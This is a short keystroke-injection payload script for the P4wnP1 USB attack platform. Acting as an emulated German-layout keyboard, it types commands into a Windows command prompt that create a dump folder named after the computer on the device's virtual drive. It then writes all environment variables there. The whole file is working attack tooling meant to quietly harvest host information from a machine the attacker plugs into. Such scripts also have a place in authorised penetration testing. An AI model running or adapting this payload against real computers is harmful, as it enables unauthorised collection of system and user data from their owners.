// WIN-C01--Payload-DumpEnvironment.js
// Version: 2023-06-08--001


// Set keyboard layout to German (DE)
layout('DE');
typingSpeed(0,0);


// Clear screen
type("cls");
press("RETURN");


// Create directory for dumps on virtual P4wnP1 USB drive
type("set DumpPath=\"%DriveLetter%/%COMPUTERNAME%/dumps\"");
press("RETURN");
type("mkdir %DumpPath%");
press("RETURN");


// Dump environment variables
type("set > %DumpPath%/set.txt");
press("RETURN");
delay(700);



